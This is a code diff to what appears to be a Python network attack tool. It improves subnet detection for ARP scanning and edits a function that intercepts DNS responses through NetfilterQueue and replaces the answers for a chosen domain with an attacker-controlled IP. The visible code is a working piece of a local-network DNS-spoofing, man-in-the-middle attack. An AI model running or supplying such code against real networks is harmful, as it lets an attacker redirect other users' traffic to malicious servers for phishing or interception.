@@ -3,7 +3,10 @@
 import os
 import time
 import threading
+import netifaces as ni
 import scapy.all as scapy
+
+from math import log2
 from netfilterqueue import NetfilterQueue
 
 def start_command():
@@ -19,10 +22,16 @@ def end_command():
 
 
 def get_device_info():
-	attacker_ip            = scapy.get_if_addr(scapy.conf.iface) #default interface
-	attacker_mac           = scapy.get_if_hwaddr(scapy.conf.iface) #default interface   
-	gateway_ip             = scapy.conf.route.route('0.0.0.0')[2]
-	target_domain          = gateway_ip + '/24'
+	attacker_ip   = scapy.get_if_addr(scapy.conf.iface) #default interface
+	attacker_mac  = scapy.get_if_hwaddr(scapy.conf.iface) #default interface   
+	
+	gateway       = ni.gateways()['default'][ni.AF_INET]
+	af_inet       = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
+	cidr          = 32 - sum([int(log2(256 - int(num))) for num in af_inet['netmask'].split('.')])
+
+	gateway_ip    = gateway[0]
+
+	target_domain          = gateway_ip + '/' + str(cidr)
 	answered, unanswered   = scapy.arping(target_domain, verbose=False)
 	# answered, unanswered = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=target_domain), timeout=2)
     
@@ -73,7 +82,7 @@ def modify_packet(pkt):
 	
 	if scapy_pkt.haslayer(scapy.DNSRR): # DNS Resource Record
 		qname = scapy_pkt[scapy.DNSQR].qname  # extract the domain name
-		print(str(qname))
+
 		if domain_name in qname:
 			fake_answer					 = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
 			scapy_pkt[scapy.DNS].an 	 = fake_answer
